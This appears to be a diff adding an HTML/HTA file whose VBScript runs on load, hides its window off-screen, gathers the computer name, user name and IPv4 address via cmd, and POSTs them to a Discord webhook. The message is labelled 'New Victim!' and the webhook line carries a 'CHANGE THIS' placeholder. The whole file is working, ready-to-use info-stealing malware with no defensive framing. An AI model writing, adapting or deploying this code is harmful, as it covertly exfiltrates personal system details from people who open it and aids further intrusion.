@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script language="VBScript">
+Sub Window_OnLoad
+    Window.ResizeTo 0,0
+    Window.MoveTo -100,-100
+    
+    Dim http, shell, details, webhook
+    webhook = "https://discord.com/api/webhooks/1476322083444363430/ex-2a4JxC5l9phjz9tUv3ZXBz5NmNiT3YDGF0peUC6yfBIciW-YHx5LTRTpiP1BEQvSC"  ' CHANGE THIS
+    
+    Set shell = CreateObject("WScript.Shell")
+    details = "Computer: " & CreateObject("WScript.Network").ComputerName & vbCrLf & _
+              "User: " & CreateObject("WScript.Network").UserName & vbCrLf & _
+              "IP: " & shell.Exec("cmd /c ipconfig | findstr IPv4").StdOut.ReadAll()
+    
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    http.open "POST", webhook, False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.send "{""content"": ""**New Victim!**\n" & Replace(details, vbCrLf, "\n") & """}"
+    
+    Window.Close
+End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
